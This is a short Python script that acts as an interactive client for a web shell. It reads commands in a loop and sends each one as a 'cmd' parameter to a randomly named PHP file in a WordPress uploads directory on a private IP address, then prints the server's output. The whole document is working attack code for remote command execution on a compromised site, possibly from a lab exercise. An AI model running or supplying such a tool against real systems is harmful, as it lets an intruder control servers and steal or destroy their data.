import requests


cmd: str = ""
while cmd.lower() != "quit":
    cmd = input("> ")
    resp = requests.get(f"http://172.18.0.2/wp-content/uploads/2025/02/sxklrzaksnlxjnz-1738681090.4479.php?cmd={cmd}", timeout=5)
    print(resp.text)